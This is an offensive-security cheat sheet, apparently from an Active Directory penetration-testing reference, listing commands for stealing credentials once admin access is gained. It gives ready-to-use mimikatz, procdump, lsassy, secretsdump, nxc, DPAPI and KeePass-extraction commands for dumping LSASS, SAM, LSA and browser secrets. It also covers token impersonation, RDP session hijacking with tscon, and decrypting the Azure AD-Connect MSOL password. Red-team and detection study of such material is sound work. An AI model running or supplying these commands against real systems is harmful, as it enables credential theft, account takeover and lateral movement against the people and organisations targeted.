# Admin access

## Extract credentials from LSASS.exe
- LSASS as protected process
  - `PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp #before 2022-07-22 update`
  - `mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate"  "sekurlsa::logonpasswords" "!processprotect  /process:lsass.exe" "!-"`
- Extract LSASS secrets  >>> User + Pass || NTLM || PassTheHash || Clear text move
  - `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
  - `mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"  "exit"`
  - `msf> load kiwi creds_all`
  - `nxc smb <ip_range> -u <user> -p <password> -M lsassy`
  - `lsassy -d <domain> -u <user> -p <password> <ip>`

## Extract credentials from SAM >>> NTLM || PassTheHash
- `nxc smb <ip_range> -u <user> -p <password> --sam`
- `msf> hashdump`
- `mimikatz "privilege::debug" "lsadump::sam" "exit"`
- `secretsdump.py <domain>/<user>:<password>@<ip>`
- `reg save HKLM\SAM <file>;  reg save HKLM\SYSTEM <file>`
  - `secretsdump.py -system SYSTEM -sam SAM LOCAL`
- `reg.py <domain>/<user>:<password>@<ip> backup -o '\\<smb_ip>\share'`
  - `secretsdump.py -system SYSTEM -sam SAM LOCAL`
- `regsecrets.py <domain>/<user>:<password>@<ip>`

## Extract credentials from LSA >>> MsCache 2 || User + Pass
- `nxc smb <ip_range> -u <user> -p <password> --lsa`
- `mimikatz "privilege::debug" "lsadump::lsa" "exit"`
- `reg save HKLM\SECURITY <file>;  reg save HKLM\SYSTEM <file>`
  - `secretsdump.py -system SYSTEM -security SECURITY`
- `reg.py <domain>/<user>:<password>@<ip> backup -o '\\<smb_ip>\share'`

## Extract credentials from DPAPI
- DPAPI >>> User + Pass || PassTheHash || Clear text move
  - `nxc smb <ip_range> -u <user> -p <password> --dpapi [cookies] [nosystem]`
  - `donpapi <domain>/<user>:<password>@<target>`
  - `dpapidump.py <domain>/<user>:<password>@<target>`
  - get masterkey
    - `mimikatz "sekurlsa::dpapi"`
      - `dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>`
    - `lsassy -d <domain> -u <user> -p <password> <ip> -m rdrleakdiag -M masterkeys`
      - `dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>`
  - `SharpDPAPI.exe triage`

- Crack users masterkey >>> DPAPImk
  - copy c:\users\<user>\AppData\Roaming\Microsoft\Protect\<SID> 
    - `DPAPImk2john.py --preferred <prefered_file>`
      - `DPAPImk2john.py -c domain -mk <masterkey> -S <sid>`

## Impersonate
- Impersonate >>> ACL || User + Pass
  - `msf> use incognito impersonate_token <domain>\\<user>`
  - `nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users`
    - `nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>`
  - `irs.exe list`
    - `irs.exe exec -p <pid> -c <command>`

- Impersonate with adcs >>> NTLM || Pass The Hash / Ticket / Certificate
  - `masky - d <domain> -u <user>  (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>`

- Impersonate RDP Session >>> RDP
  - `psexec.exe -s -i cmd`
    - `query user`
      - `tscon.exe <id> /dest:<session_name>`

## Misc
- Find Users >>> Username
  - `smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv`
- Extract Keepass >>> User + Pass
  - `KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll`
  - `KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>`
- Hybrid (Azure AD-Connect) >>> DCSYNC
  - Dump cleartext password of MSOL Account on ADConnect Server
    - `azuread_decrypt_msol_v2.ps1`
    - `nxc smb <ip> -u <user> -p <password> -M msol`